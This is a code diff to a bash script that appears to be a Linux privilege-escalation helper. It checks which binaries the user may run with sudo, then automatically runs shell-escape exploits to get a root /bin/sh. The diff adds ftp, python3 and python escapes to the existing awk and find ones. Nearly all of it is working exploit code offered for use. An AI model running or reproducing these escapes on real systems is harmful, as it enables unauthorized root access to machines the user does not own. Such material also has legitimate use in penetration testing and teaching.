@@ -63,12 +63,20 @@ read -p "Would you like to try and auto exploit any SUDO rights? (y/n):" answer
 if [ $answer = n ]; then
 	echo -e '\E[31;40m' "Not trying to exploit anything, you can see SUDO rights in /tmp/sudo.txt"; tput sgr0
 else
-	if egrep 'awk|find' sudo.txt; then
+	if egrep 'awk|find|ftp|python3|python' sudo.txt; then
 		echo -e '\E[31;40m' "Found something and trying to exploit"; tput sgr0
 		if grep -w $b"awk" sudo.txt; then
 			sudo awk 'BEGIN {system("/bin/sh")}'
 		elif grep -w $b"find" sudo.txt; then
 			sudo find . -exec /bin/sh -p \; -quit
+		elif grep -w $b"ftp" sudo.txt; then
+			echo -e '\E[31;40m' "Run the following command in FTP !/bin/sh"; tput sgr0
+			sudo ftp
+			!/bin/sh
+		elif grep -w $b"python3" sudo.txt; then
+			sudo python3 -c 'import os; os.system("/bin/sh")'
+		elif grep -w $b"python" sudo.txt; then
+			sudo python -c 'import os; os.system("/bin/sh")'
 		fi
 	fi
 fi
